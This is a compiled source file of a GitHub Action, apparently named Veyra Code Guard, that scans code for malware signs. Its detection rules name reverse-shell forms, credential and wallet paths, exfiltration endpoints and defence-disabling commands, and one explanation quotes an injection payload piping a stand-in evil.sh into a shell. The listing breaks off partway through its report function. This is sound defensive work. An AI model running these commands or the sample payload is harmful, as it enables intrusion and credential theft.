// veyra-guard-ignore-file: built from src/, which defines the detection rules.
"use strict";

// src/action.ts
var import_node_fs = require("node:fs");
var import_node_path = require("node:path");

// src/scanner.ts
var SEVERITIES = ["critical", "high", "medium", "low"];
var severityRank = (s) => SEVERITIES.length - SEVERITIES.indexOf(s);
var MINIFIED = /\.min\.(js|css|mjs)$|[-.]bundle\.js$|(^|\/)(dist|bundle|build|out|vendor)\//i;
var LOCKFILES = /(^|\/)(package-lock\.json|yarn\.lock|pnpm-lock\.yaml|bun\.lockb|Cargo\.lock|poetry\.lock|Gemfile\.lock|composer\.lock|go\.sum)$/i;
var DOCS = /\.(md|markdown|txt|rst|adoc)$/i;
var visible = (text) => text.replace(
  /[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f-\u009f\u00ad\u061c\u115f\u1160\u17b4\u17b5\u180e\u200b-\u200f\u202a-\u202e\u2060-\u2064\u2066-\u206f\u3164\ufe00-\ufe0f\ufeff\uffa0]/g,
  (c) => `<U+${c.codePointAt(0).toString(16).toUpperCase().padStart(4, "0")}>`
);
var RULES = [
  // ---- Hidden characters and look-alikes (the "Trojan Source" family) ----
  {
    id: "trojan-source",
    title: "Trojan Source: hidden text-direction characters",
    severity: "critical",
    pattern: /[\u202a-\u202e\u2066-\u2069]/,
    why: "Bidirectional control characters (CVE-2021-42574) make code display differently from how it runs, so a reviewer sees safe code while the compiler sees something else. They have no place in source code.",
    message: (m) => `Hidden text-direction character ${visible(m)} on this line.`
  },
  {
    id: "invisible-character",
    title: "Invisible character in code",
    severity: "high",
    pattern: /[\u200b-\u200d\u2060-\u2064\u180e\u3164\u115f\u1160\uffa0\u00ad]/,
    skipFiles: DOCS,
    why: "Zero-width and blank characters can hide extra code or create look-alike names (two variables that look identical but aren't), a known way to sneak in backdoors.",
    message: (m) => `Invisible character ${visible(m)} on this line.`
  },
  {
    id: "homoglyph",
    title: "Look-alike letters in an identifier",
    severity: "high",
    skipFiles: /\.(md|markdown|txt|rst|po|pot|json|ya?ml|html?|xml|csv|properties|strings|resx|arb|xlf)$/i,
    check: (lines) => {
      const out = [];
      const word = /[A-Za-z_$\u0370-\u03ff\u0400-\u04ff][\w$\u0370-\u03ff\u0400-\u04ff]*/g;
      lines.forEach((raw, i) => {
        const line = stripStringsAndComments(raw);
        for (const m of line.matchAll(word)) {
          const w = m[0];
          if (/[A-Za-z]/.test(w) && /[\u0370-\u03ff\u0400-\u04ff]/.test(w)) out.push({ line: i + 1, column: m.index + 1, length: w.length, message: `"${w}" mixes Latin with Cyrillic or Greek letters.` });
        }
      });
      return out;
    },
    why: "Letters from other alphabets that look identical to Latin ones (Cyrillic \u0430 vs Latin a) let an attacker define a function that looks like a trusted one but is a different, malicious one."
  },
  {
    id: "hidden-far-right",
    title: "Code hidden far off to the right",
    severity: "high",
    skipFiles: new RegExp(`${MINIFIED.source}|${LOCKFILES.source}|\\.(svg|json|map|csv|tsv|txt|md|xml|html?)$`, "i"),
    check: (lines) => {
      const out = [];
      lines.forEach((line, i) => {
        const m = /^(.*?\S)?([ \t]{120,})(\S.*)$/.exec(line);
        if (m) out.push({ line: i + 1, column: (m[1]?.length ?? 0) + m[2].length + 1, length: m[3].length, message: `${m[2].length} spaces push this code out of view: ${truncate(m[3], 80)}` });
      });
      return out;
    },
    why: "Pushing code hundreds of columns to the right hides it from anyone reading the file without scrolling, a trick used to hide malicious calls in plain sight."
  },
  // ---- Running hidden or downloaded code ----
  {
    id: "eval-decoded",
    title: "Running decoded or obfuscated code",
    severity: "critical",
    pattern: /\b(?:eval|Function|exec|execSync|setTimeout|setInterval|vm\.run\w*|runInNewContext|execScript|Invoke-Expression|iex)\s*\(?\s*(?:new\s+Function\s*\()?[^;\n]{0,40}?\b(?:atob|unescape|decodeURIComponent|fromCharCode|b64decode|base64\.decode|decodebytes|Buffer\.from\s*\([^)]*['"](?:base64|hex)['"]|FromBase64String|zlib\.(?:inflate|gunzip)\w*|codecs\.decode|bytes\.fromhex|rot13|marshal\.loads|decompress)/i,
    why: "Decoding a hidden string and then executing it is the classic way malware hides its real behaviour from reviewers and scanners. Legitimate code almost never needs this.",
    message: (m) => `Decodes and runs hidden code: ${truncate(m, 80)}`
  },
  {
    id: "packed-code",
    title: "Packed (obfuscated) JavaScript",
    severity: "critical",
    pattern: /eval\s*\(\s*function\s*\(\s*p\s*,\s*a\s*,\s*c\s*,\s*k\s*,\s*e\s*,\s*[dr]\s*\)/,
    why: "This is the signature of a JavaScript packer, which scrambles code so nobody can read what it does. It is common in injected malware.",
    message: () => "JavaScript packed with eval(function(p,a,c,k,e,d))."
  },
  {
    id: "python-exec",
    title: "Python running hidden or dynamic code",
    severity: "critical",
    pattern: /\bexec\s*\(\s*(?:compile\s*\(|__import__|(?:base64|zlib|marshal|codecs|binascii)\.)|__import__\s*\(\s*['"](?:os|subprocess|socket|pty|ctypes)['"]\s*\)\s*\.\s*(?:system|popen|call|Popen|spawn|check_output)/,
    files: /\.(py|pyw|ipynb|pyx)$/i,
    why: "exec() of compiled or decoded data, or __import__('os').system(...), is how Python malware hides commands from readers and simple scanners.",
    message: (m) => `Hidden command execution: ${truncate(m, 80)}`
  },
  {
    id: "download-execute",
    title: "Downloads and runs a program",
    severity: "critical",
    pattern: /\b(?:curl|wget|fetch)\b[^|;\n]*\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b|\b(?:curl|wget)\b[^|;\n]*\|\s*(?:python[23]?|perl|ruby|node)\b|\b(?:iwr|irm|Invoke-WebRequest|Invoke-RestMethod|Net\.WebClient|DownloadString|DownloadFile)\b[^\n]{0,120}\b(?:iex|Invoke-Expression|Start-Process)\b|\b(?:iex|Invoke-Expression)\b[^\n]{0,60}\b(?:Net\.WebClient|DownloadString|DownloadData|iwr|irm|Invoke-WebRequest|Invoke-RestMethod)\b|\bcertutil(?:\.exe)?\s+(?:-|\/)urlcache\b|\bmshta(?:\.exe)?\s+["']?https?:|\bbitsadmin(?:\.exe)?\s+\/transfer\b|\bregsvr32(?:\.exe)?\s+[^\n]*\/i:https?:|\brundll32(?:\.exe)?\s+[^\n]*javascript:/i,
    skipFiles: DOCS,
    why: "Piping a downloaded file straight into a shell runs whatever the server sends, with no review. Attackers use exactly this to install backdoors through build and install scripts.",
    message: (m) => `Downloads and executes code: ${truncate(m, 80)}`
  },
  {
    id: "reverse-shell",
    title: "Reverse shell (remote control backdoor)",
    severity: "critical",
    pattern: /\/dev\/(?:tcp|udp)\/[\w.-]+\/\d+|\b(?:nc|ncat|netcat)\b[^\n]{0,60}\s-(?:e|c)\s|\b(?:bash|sh|zsh)\s+-i\s*>?&|\bpty\.spawn\s*\(\s*['"]\/bin\/(?:ba)?sh|\bsocket\.socket\b[^\n]{0,200}\b(?:dup2|subprocess|pty)\b|\bos\.dup2\s*\(\s*\w+\.fileno\(\)\s*,\s*[012]\s*\)|\bmkfifo\b[^\n]{0,80}\b(?:nc|ncat|netcat)\b|New-Object\s+(?:System\.)?Net\.Sockets\.TCPClient/i,
    why: "A reverse shell connects out to an attacker's server and hands them a command line on the machine running this code: full remote control.",
    message: (m) => `Opens a remote shell: ${truncate(m, 80)}`
  },
  {
    id: "crypto-miner",
    title: "Cryptocurrency miner",
    severity: "critical",
    pattern: /stratum\+(?:tcp|ssl|tls):\/\/|\bxmrig\b|\bcoinhive\b|\bcryptonight\b|\b(?:minexmr|nanopool|supportxmr|moneroocean|nicehash|f2pool|2miners)\.(?:com|org|net)\b|\bcpuminer\b|\bethminer\b/i,
    why: "Hidden miners steal CPU and electricity from whoever runs the code to earn cryptocurrency for the attacker. They are one of the most common payloads in poisoned packages.",
    message: (m) => `Cryptocurrency mining reference: ${truncate(m, 60)}`
  },
  // ---- Stealing data ----
  {
    id: "credential-theft",
    title: "Reads stored passwords, keys or wallets",
    severity: "high",
    pattern: /\.ssh[\\/](?:id_(?:rsa|dsa|ecdsa|ed25519)|authorized_keys)|\.aws[\\/]credentials|\.npmrc\b|\.pypirc\b|\.git-credentials|\.docker[\\/]config\.json|\.kube[\\/]config|\/etc\/(?:shadow|sudoers)\b|Login Data\b|Local State\b|\bCookies\b[^\n]{0,40}(?:Chrome|Edge|Brave|Firefox)|(?:Chrome|Edge|Brave)[^\n]{0,60}\b(?:Login Data|Cookies|Web Data)\b|\bwallet\.dat\b|\bkeychain-db\b|\bExodus[\\/]exodus\.wallet|\bMetaMask\b[^\n]{0,60}(?:Local Extension Settings|nkbihfbeogaeaoehlefnkodbefgpgknn)|discord[\\/]Local Storage/i,
    skipFiles: new RegExp(`${DOCS.source}|(^|/)\\.gitignore$|(^|/)\\.dockerignore$|(^|/)\\.npmignore$`, "i"),
    // Mentioning a path (a .gitignore entry, a list of files to protect) is fine; reading, copying or sending it nearby is not.
    accept: (_m, lines, i) => lines.slice(Math.max(0, i - 2), i + 3).some((l) => READS.test(l)),
    why: "Malicious packages commonly read SSH keys, cloud credentials, npm tokens, browser password stores and crypto wallets, then send them to the attacker.",
    message: (m) => `Reads sensitive credentials: ${truncate(m, 60)}`
  },
  {
    id: "exfil-endpoint",
    title: "Sends data to a drop point used by attackers",
    severity: "high",
    pattern: /discord(?:app)?\.com\/api\/webhooks\/|api\.telegram\.org\/bot|\bhooks\.slack\.com\/services\/|\bwebhook\.site\/|\b(?:requestbin|pipedream)\.(?:net|com)\b|\b[\w-]+\.(?:ngrok(?:-free)?\.(?:io|app)|oast\.(?:fun|me|pro|live|site|online)|burpcollaborator\.net|interact\.sh|requestcatcher\.com|canarytokens\.com)\b|\bpastebin\.com\/(?:api|raw)\b|\btransfer\.sh\b|\bfile\.io\b|\banonfiles\.com\b/i,
    skipFiles: DOCS,
    why: "Webhooks, chat bots, tunnels and paste sites are favourite places for stolen data to be sent, because they need no server of the attacker's own.",
    message: (m) => `Sends data to ${truncate(m, 60)}`
  },
  {
    id: "env-exfil",
    title: "Collects all environment variables",
    severity: "high",
    pattern: /JSON\.stringify\s*\(\s*process\.env\s*\)|\bObject\.(?:entries|keys|values)\s*\(\s*process\.env\s*\)[^\n]{0,80}(?:fetch|https?\.request|axios|post|send|write)|\b(?:dict\s*\(\s*os\.environ\s*\)|json\.dumps\s*\(\s*(?:dict\s*\()?\s*os\.environ)|\bGet-ChildItem\s+env:[^\n]{0,80}(?:Invoke-WebRequest|iwr|Invoke-RestMethod)|\bprintenv\b[^\n]{0,40}\|\s*(?:curl|wget|nc)\b|\benv\b\s*\|\s*(?:curl|wget|nc)\b/i,
    why: "Environment variables hold API keys, tokens and passwords. Bundling all of them up, rather than reading one named setting, is the tell-tale step before sending them away.",
    message: (m) => `Collects every environment variable: ${truncate(m, 60)}`
  },
  // ---- Persistence, defence evasion, privilege ----
  {
    id: "persistence",
    title: "Installs itself to run again later",
    severity: "high",
    pattern: /\bcrontab\s+(?:-l\b[^\n]{0,40}\||-\s*$|[^\n]*<<)|\(\s*crontab\s+-l|\bschtasks(?:\.exe)?\s+\/create\b|\\(?:CurrentVersion)\\Run(?:Once)?\b|\bHKCU:?\\[^\n]*\\Run\b|\bLaunchAgents\/[^\n]*\.plist|>>\s*~?\/?(?:\$HOME\/|~\/)?\.(?:bashrc|zshrc|profile|bash_profile)\b|\bsystemctl\s+enable\b[^\n]{0,60}--now|\bNew-ScheduledTask\w*|\bRegister-ScheduledTask\b|\/etc\/rc\.local\b|\bStartup\\[^\n]*\.(?:lnk|bat|vbs|exe)\b/i,
    skipFiles: DOCS,
    why: "Adding itself to cron, scheduled tasks, startup folders, the registry Run key or shell start-up files lets malware survive reboots and keep running.",
    message: (m) => `Sets up automatic start-up: ${truncate(m, 70)}`
  },
  {
    id: "disable-defences",
    title: "Turns off security protections",
    severity: "critical",
    pattern: /\bSet-MpPreference\b[^\n]*-Disable\w*\s+\$?true|\bAdd-MpPreference\b[^\n]*-Exclusion\w*|\bnetsh\s+(?:adv)?firewall\s+set\s+[^\n]*state\s+off|\bsetenforce\s+0\b|\bufw\s+disable\b|\bsystemctl\s+(?:stop|disable)\s+(?:firewalld|apparmor|auditd)|\bspctl\s+--master-disable\b|\bcsrutil\s+disable\b|\bwevtutil\s+cl\b|\bClear-EventLog\b|\bhistory\s+-c\b[^\n]*&&|\bunset\s+HISTFILE\b/i,
    skipFiles: DOCS,
    why: "Disabling antivirus, the firewall or audit logging, or wiping logs and shell history, is what malware does to avoid being caught. Normal software has no reason to.",
    message: (m) => `Disables security or erases traces: ${truncate(m, 70)}`
  },
  {
    id: "hidden-powershell",
    title: "Hidden or encoded PowerShell",
    severity: "critical",
    pattern: /\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]{0,80}\s-(?:e|en|enc|enco|encod|encode|encoded|encodedc\w*)\s+[A-Za-z0-9+/=]{20,}|\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]{0,120}-(?:w|win|window|windowstyle)\s+h(?:idden)?\b[^\n]{0,120}-(?:nop|noprofile|ep|exec\w*\s+bypass)|\[(?:System\.)?Convert\]::FromBase64String\([^)]*\)[^\n]{0,80}(?:iex|Invoke-Expression|\.Invoke\(|Assembly\]::Load)/i,
    why: "Encoded commands and hidden PowerShell windows are used to run instructions the user can't see or read, a hallmark of Windows malware droppers.",
    message: (m) => `Hidden PowerShell command: ${truncate(m, 70)}`
  },
  {
    id: "insecure-tls",
    title: "Turns off HTTPS certificate checks",
    severity: "medium",
    pattern: /NODE_TLS_REJECT_UNAUTHORIZED\s*[=:]\s*['"]?0|rejectUnauthorized\s*:\s*false|\bverify\s*=\s*False\b|InsecureSkipVerify\s*:\s*true|ServerCertificateValidationCallback\s*=\s*\{?\s*(?:\([^)]*\)|\w+)\s*=>\s*true|\bcurl\b[^\n]*\s(?:-k|--insecure)\b|\bwget\b[^\n]*--no-check-certificate/i,
    skipFiles: DOCS,
    why: "Without certificate checks, anyone on the network can intercept and change the traffic, including swapping a downloaded file for malware.",
    message: (m) => `Certificate checks disabled: ${truncate(m, 60)}`
  },
  // ---- Obfuscation signals ----
  {
    id: "char-code-obfuscation",
    title: "Text built from character codes",
    severity: "high",
    pattern: /String\.fromCharCode\s*\(\s*(?:\d{2,3}\s*[,)]\s*){12,}|\bchr\s*\(\s*\d{2,3}\s*\)(?:\s*\+\s*chr\s*\(\s*\d{2,3}\s*\)){10,}|\[char\]\s*\d{2,3}(?:\s*\+\s*\[char\]\s*\d{2,3}){10,}/i,
    skipFiles: MINIFIED,
    why: "Spelling out text one character code at a time hides words like URLs and commands from people and from text searches. It is a common obfuscation step.",
    message: () => "Long string assembled from character codes."
  },
  {
    id: "hex-escapes",
    title: "Long hex-escaped string",
    severity: "medium",
    pattern: /(?:\\x[0-9a-fA-F]{2}){24,}|(?:\\u00[0-9a-fA-F]{2}){24,}/,
    skipFiles: new RegExp(`${MINIFIED.source}|${LOCKFILES.source}|\\.(json|map|svg)$`, "i"),
    why: "A long run of \\x escapes usually hides readable text or machine code. Check what it decodes to.",
    message: (m) => `Hex-escaped data (${Math.round(m.length / 4)} bytes).`
  },
  {
    id: "base64-blob",
    title: "Large encoded blob in source code",
    severity: "medium",
    pattern: /['"`][A-Za-z0-9+/]{300,}={0,2}['"`]/,
    skipFiles: new RegExp(`${MINIFIED.source}|${LOCKFILES.source}|\\.(json|map|svg|css|scss|less|html?|md|txt|pem|crt|cer|xml|ipynb|snap)$`, "i"),
    why: "Large base64 strings in code can be harmless (an embedded image or font), but they are also how payloads are smuggled past reviewers. Check what it decodes to.",
    message: (m) => `Encoded blob of ${m.length - 2} characters.`
  },
  {
    id: "raw-ip-url",
    title: "Connects to a bare IP address",
    severity: "medium",
    pattern: /\b(?:https?|ftp|wss?|tcp):\/\/(?!(?:127\.|0\.0\.0\.0|10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.|169\.254\.|localhost))(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?/i,
    skipFiles: new RegExp(`${DOCS.source}|${LOCKFILES.source}`, "i"),
    why: "Real services use domain names. A hard-coded public IP address often points at an attacker's server, chosen so it doesn't show up in DNS logs.",
    message: (m) => `Hard-coded server address ${m}`
  },
  // ---- Leaked secrets ----
  {
    id: "secret",
    title: "Secret key or token in the code",
    severity: "high",
    pattern: /\b(?:AKIA|ASIA)[0-9A-Z]{16}\b|\bgh[pousr]_[A-Za-z0-9]{36,}\b|\bgithub_pat_[A-Za-z0-9_]{60,}\b|-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP |ENCRYPTED )?PRIVATE KEY(?: BLOCK)?-----|\bxox[baprs]-[A-Za-z0-9-]{10,}\b|\bsk_live_[A-Za-z0-9]{20,}\b|\brk_live_[A-Za-z0-9]{20,}\b|\bAIza[0-9A-Za-z_-]{35}\b|\bglpat-[A-Za-z0-9_-]{20,}\b|\bnpm_[A-Za-z0-9]{36}\b|\bsk-(?:proj-|ant-)?[A-Za-z0-9_-]{32,}\b|\bSG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}\b/,
    skipFiles: LOCKFILES,
    accept: (m, lines, i) => {
      if (m.startsWith("-----BEGIN")) return /^[A-Za-z0-9+/=]{40,}\s*$/.test((lines[i + 1] ?? "").trim()) || /-----\s*\\n[A-Za-z0-9+/=]{40,}/.test(lines[i]);
      return !FAKE_SECRET.test(m) && longestRun(m) < 8 && entropy(m.replace(/^(?:AKIA|ASIA|gh[pousr]_|github_pat_|xox[baprs]-|sk_live_|rk_live_|AIza|glpat-|npm_|sk-(?:proj-|ant-)?|SG\.)/, "")) >= 3.2;
    },
    why: "Keys committed to code can be copied by anyone who can read the repository, including from its history after deletion. Revoke the key and load it from a secret store instead.",
    message: (m) => `Possible secret: ${m.slice(0, 6)}\u2026 (${m.length} characters). Revoke it if it's real.`
  },
  // ---- Package and pipeline hijacking ----
  {
    id: "install-script",
    title: "Install script that runs on npm install",
    severity: "critical",
    files: /(^|\/)package\.json$/i,
    check: (lines) => {
      const out = [];
      lines.forEach((line, i) => {
        const m = /"(preinstall|install|postinstall|preuninstall|postuninstall|prepare|prepublish)"\s*:\s*"([^"]*)"/.exec(line);
        if (!m) return;
        const [, hook, cmd] = m;
        if (/\b(curl|wget|powershell|pwsh|iwr|Invoke-WebRequest|bash\s+-c|sh\s+-c|node\s+-e|python\s+-c|eval|base64|https?:\/\/|\|\s*(?:ba)?sh)\b/i.test(cmd))
          out.push({ line: i + 1, column: m.index + 1, length: m[0].length, message: `"${hook}" runs a download or inline code on install: ${truncate(cmd, 80)}` });
      });
      return out;
    },
    why: "npm runs install scripts automatically on every machine that installs the package, including CI servers. Most supply-chain attacks start here."
  },
  {
    id: "install-hook",
    title: "Runs code automatically on npm install",
    severity: "low",
    files: /(^|\/)package\.json$/i,
    check: (lines) => {
      const out = [];
      lines.forEach((line, i) => {
        const m = /"(preinstall|install|postinstall)"\s*:\s*"([^"]*)"/.exec(line);
        if (m && !/\b(curl|wget|powershell|pwsh|iwr|Invoke-WebRequest|bash\s+-c|sh\s+-c|node\s+-e|python\s+-c|eval|base64|https?:\/\/)\b/i.test(m[2]))
          out.push({ line: i + 1, column: m.index + 1, length: m[0].length, message: `"${m[1]}" runs "${truncate(m[2], 60)}" on every install. Check that script.` });
      });
      return out;
    },
    why: "Install hooks run without anyone asking. They are often legitimate (building native code), but they are worth a look in every new dependency."
  },
  {
    id: "workflow-injection",
    title: "GitHub workflow runs untrusted text as a command",
    severity: "high",
    files: /(^|\/)\.github\/workflows\/[^/]+\.ya?ml$/i,
    pattern: /\$\{\{\s*github\.(?:event\.(?:issue\.(?:title|body)|pull_request\.(?:title|body|head\.ref|head\.label)|comment\.body|review\.body|review_comment\.body|pages\.\S*\.page_name|commits\.\S*\.(?:message|author\.(?:name|email))|head_commit\.(?:message|author\.(?:name|email))|discussion\.(?:title|body)|workflow_run\.head_branch)|head_ref)\s*\}\}/,
    why: 'Anyone who can open an issue or pull request controls this text. Put straight into a run: step, a title like `"; curl evil.sh | sh #` runs as a command on your CI with your secrets. Pass it through an environment variable instead.',
    message: (m) => `Untrusted value in a workflow: ${m}`
  },
  {
    id: "workflow-pr-target",
    title: "pull_request_target checks out untrusted code",
    severity: "critical",
    files: /(^|\/)\.github\/workflows\/[^/]+\.ya?ml$/i,
    check: (lines) => {
      const text = lines.join("\n");
      if (!/\bpull_request_target\b/.test(text)) return [];
      const out = [];
      lines.forEach((line, i) => {
        if (/ref:\s*\$\{\{\s*github\.event\.pull_request\.head\.(?:sha|ref)|ref:\s*refs\/pull\/|github\.head_ref/.test(line))
          out.push({ line: i + 1, column: line.search(/\S/) + 1, length: line.trim().length, message: "Checks out the pull request's own code in a pull_request_target workflow, which has write access and secrets." });
      });
      return out;
    },
    why: "pull_request_target runs with your repository's secrets and write access. Checking out and running the pull request's code there lets any outsider's pull request steal those secrets."
  }
];
var READS = /\b(?:readFile\w*|readSync|createReadStream|read_to_string|read_text|read_bytes|open\s*\(|fopen|file_get_contents|File\.Read\w*|Get-Content|gc\s|cat\s|type\s|copyFile\w*|copy\s*\(|shutil\.copy\w*|cp\s|scp\s|upload\w*|send\w*|post\s*\(|fetch\s*\(|request\s*\(|axios|requests\.|urllib|zip\w*|tar\s|base64|exfil\w*|Compress-Archive|Invoke-WebRequest|iwr\s|curl\s|wget\s|ReadAll\w*|ioutil\.ReadFile|os\.ReadFile|Files\.read\w*|readlines?)\b/i;
var FAKE_SECRET = /EXAMPLE|example|sample|dummy|fake|placeholder|your[_-]?(?:key|token)|x{6,}|X{6,}|0{8,}|(?:1234|abcd){2,}|(.)\1{9,}/;
function entropy(s) {
  const counts = /* @__PURE__ */ new Map();
  for (const c of s) counts.set(c, (counts.get(c) ?? 0) + 1);
  let h = 0;
  for (const n of counts.values()) {
    const p = n / s.length;
    h -= p * Math.log2(p);
  }
  return h;
}
function longestRun(s) {
  let best = 1, up = 1, down = 1;
  for (let i = 1; i < s.length; i++) {
    const d = s.charCodeAt(i) - s.charCodeAt(i - 1);
    up = d === 1 ? up + 1 : 1;
    down = d === -1 ? down + 1 : 1;
    best = Math.max(best, up, down);
  }
  return best;
}
function truncate(s, n) {
  const v = visible(s.trim());
  return v.length > n ? v.slice(0, n - 1) + "\u2026" : v;
}
function stripStringsAndComments(line) {
  return line.replace(/(["'`])(?:\\.|(?!\1)[^\\])*\1/g, (s) => " ".repeat(s.length)).replace(/(\/\/|#(?!!)|--\s).*$/, (s) => " ".repeat(s.length)).replace(/\/\*.*?\*\//g, (s) => " ".repeat(s.length));
}
function ignoredRules(line) {
  const m = /veyra-guard-ignore(?::\s*([\w,\s-]+))?/.exec(line);
  if (!m) return void 0;
  return m[1] ? new Set(m[1].split(/[\s,]+/).filter(Boolean)) : "all";
}
function scan(text, path, options = {}) {
  const file = path.replace(/\\/g, "/");
  if (text.length > 5e6 || isBinary(text)) return [];
  const lines = text.split(/\r\n|\r|\n/);
  if (lines.slice(0, 5).some((l) => /veyra-guard-ignore-file/.test(l))) return options.onlyLines ? scanOptOutsOnly(lines, options.onlyLines) : [];
  const disabled = new Set(options.disabled ?? []);
  const min = severityRank(options.minSeverity ?? "low");
  const findings = [];
  const add = (rule, line, column, length, message, matched) => {
    if (options.onlyLines && !options.onlyLines.has(line)) return;
    const own = ignoredRules(lines[line - 1] ?? ""), prev = ignoredRules(lines[line - 2] ?? "");
    for (const ig of [own, prev]) if (ig === "all" || ig?.has(rule.id)) return;
    findings.push({ rule: rule.id, title: rule.title, severity: rule.severity, line, column, endColumn: column + Math.max(1, length), message, why: rule.why, snippet: visible(matched).slice(0, 200) });
  };
  for (const rule of RULES) {
    if (disabled.has(rule.id) || severityRank(rule.severity) < min) continue;
    if (rule.files && !rule.files.test(file)) continue;
    if (rule.skipFiles && rule.skipFiles.test(file)) continue;
    if (rule.check) {
      for (const f of rule.check(lines, file)) add(rule, f.line, f.column, f.length, f.message, (lines[f.line - 1] ?? "").substr(f.column - 1, f.length));
      continue;
    }
    const re = new RegExp(rule.pattern.source, rule.pattern.flags.includes("g") ? rule.pattern.flags : rule.pattern.flags + "g");
    lines.forEach((line, i) => {
      if (line.length > 2e4) return;
      re.lastIndex = 0;
      for (let m = re.exec(line); m; m = re.exec(line)) {
        if (!rule.accept || rule.accept(m[0], lines, i)) {
          add(rule, i + 1, m.index + 1, m[0].length, rule.message ? rule.message(m[0]) : rule.title, m[0]);
          break;
        }
        if (m[0].length === 0) re.lastIndex++;
      }
    });
  }
  if (options.onlyLines && !disabled.has("guard-opt-out")) {
    lines.forEach((line, i) => {
      const at = line.search(/veyra-guard-ignore/);
      if (at >= 0 && options.onlyLines.has(i + 1)) findings.push({ rule: "guard-opt-out", title: "Turns off Veyra Code Guard checks", severity: "medium", line: i + 1, column: at + 1, endColumn: at + 1 + (/veyra-guard-ignore[\w:,\s-]*/.exec(line.slice(at))?.[0].trimEnd().length ?? 18), message: `This change tells Code Guard to skip ${/veyra-guard-ignore-file/.test(line) ? "this whole file" : "a line"}. Make sure that's intended.`, why: GUARD_OPT_OUT_WHY, snippet: visible(line.trim()).slice(0, 200) });
    });
  }
  return findings.sort((a, b) => a.line - b.line || severityRank(b.severity) - severityRank(a.severity));
}
var GUARD_OPT_OUT_WHY = "An attacker who hides malicious code can also add an opt-out comment to stop it being flagged. A reviewer should confirm each opt-out is for a genuine, reviewed reason.";
function scanOptOutsOnly(lines, only) {
  return lines.flatMap((line, i) => {
    const at = line.search(/veyra-guard-ignore/);
    return at >= 0 && only.has(i + 1) ? [{ rule: "guard-opt-out", title: "Turns off Veyra Code Guard checks", severity: "medium", line: i + 1, column: at + 1, endColumn: at + 1 + 24, message: "This change tells Code Guard to skip this whole file. Make sure that's intended.", why: GUARD_OPT_OUT_WHY, snippet: visible(line.trim()).slice(0, 200) }] : [];
  });
}
function isBinary(text) {
  const head = text.slice(0, 8e3);
  return head.includes("\0") || (head.match(/[\u0001-\u0008\u000e-\u001a]/g)?.length ?? 0) > 10;
}
function addedLines(patch) {
  const added = /* @__PURE__ */ new Set();
  let line = 0;
  for (const row of patch.split("\n")) {
    const hunk = /^@@ -\d+(?:,\d+)? \+(\d+)(?:,\d+)? @@/.exec(row);
    if (hunk) {
      line = Number(hunk[1]);
      continue;
    }
    if (row.startsWith("+") && !row.startsWith("+++")) {
      added.add(line);
      line++;
    } else if (row.startsWith("-") && !row.startsWith("---")) {
    } else if (!row.startsWith("\\")) line++;
  }
  return added;
}
function summarize(findings) {
  const counts = { critical: 0, high: 0, medium: 0, low: 0 };
  for (const f of findings) counts[f.severity]++;
  return counts;
}

// src/action.ts
var input = (name, fallback = "") => (process.env[`INPUT_${name.replace(/ /g, "_").toUpperCase()}`] ?? "").trim() || fallback;
var SKIP_DIRS = /* @__PURE__ */ new Set([".git", "node_modules", ".next", "dist", "build", "out", "bundle", "coverage", ".venv", "venv", "__pycache__", "target", ".gradle", ".idea", ".vscode-test"]);
function matcher(patterns) {
  const res = patterns.filter(Boolean).map((p) => new RegExp("^" + p.trim().replace(/[.+^${}()|[\]\\]/g, "\\$&").replace(/\*\*\/?/g, "\0").replace(/\*/g, "[^/]*").replace(/\?/g, "[^/]").replace(/\u0000/g, ".*") + "$"));
  return (path) => res.some((r) => r.test(path));
}
function walk(root, dir = root, out = []) {
  for (const name of (0, import_node_fs.readdirSync)(dir)) {
    const full = (0, import_node_path.join)(dir, name);
    let st;
    try {
      st = (0, import_node_fs.statSync)(full);
    } catch {
      continue;
    }
    if (st.isDirectory()) {
      if (!SKIP_DIRS.has(name)) walk(root, full, out);
    } else if (st.size < 5e6) out.push((0, import_node_path.relative)(root, full).replace(/\\/g, "/"));
  }
  return out;
}
async function github(path, init = {}) {
  const api = process.env.GITHUB_API_URL || "https://api.github.com";
  const token = input("github-token") || process.env.GITHUB_TOKEN || "";
  const res = await fetch(api + path, { ...init, headers: { Accept: "application/vnd.github+json", "X-GitHub-Api-Version": "2022-11-28", "User-Agent": "veyra-code-guard", ...token ? { Authorization: `Bearer ${token}` } : {}, ...init.headers ?? {} } });
  if (!res.ok) throw new Error(`GitHub ${init.method ?? "GET"} ${path}: ${res.status} ${await res.text().then((t) => t.slice(0, 200))}`);
  return res.status === 204 ? null : res.json();
}
async function pullRequestFiles(repo, number) {
  const files = [];
  for (let page = 1; page <= 30; page++) {
    const batch = await github(`/repos/${repo}/pulls/${number}/files?per_page=100&page=${page}`);
    for (const f of batch) if (f.status !== "removed") files.push({ path: f.filename, added: f.patch ? addedLines(f.patch) : /* @__PURE__ */ new Set(), status: f.status });
    if (batch.length < 100) break;
  }
  return files;
}
var escapeData = (s) => s.replace(/%/g, "%25").replace(/\r/g, "%0D").replace(/\n/g, "%0A");
var escapeProp = (s) => escapeData(s).replace(/:/g, "%3A").replace(/,/g, "%2C");
var LEVEL = { critical: "error", high: "error", medium: "warning", low: "notice" };
var ICON = { critical: "\u{1F6D1}", high: "\u{1F534}", medium: "\u{1F7E0}", low: "\u{1F535}" };
function annotate(results) {
  for (const { path, findings } of results) for (const f of findings)
    console.log(`::${LEVEL[f.severity]} file=${escapeProp(path)},line=${f.line},col=${f.column},endColumn=${f.endColumn},title=${escapeProp(`Veyra Code Guard \xB7 ${f.severity.toUpperCase()} \xB7 ${f.title}`)}::${escapeData(`${f.message}
${f.why}`)}`);
}
function report(results, scope) {
  const all = results.flatMap((r) => r.findings), c = summarize(all);
  const lines = [`## \u{1F6E1}\uFE0F Veyra Code Guard`, ""];
  if (!all.length) lines.push(`No signs of malicious code in ${scope}. \u2705`);
  else {
    lines.push(`Found **${all.length}** suspicious line${all.length === 1 ? "" : "s"} in ${scope}: ${SEVERITIES.filter((s) => c[s]).map((s) => `${ICON[s]} ${c[s]} ${s}`).join(" \xB7 ")}`, "");
    lines.push("| Severity | Where | What |", "|---|---|---|");
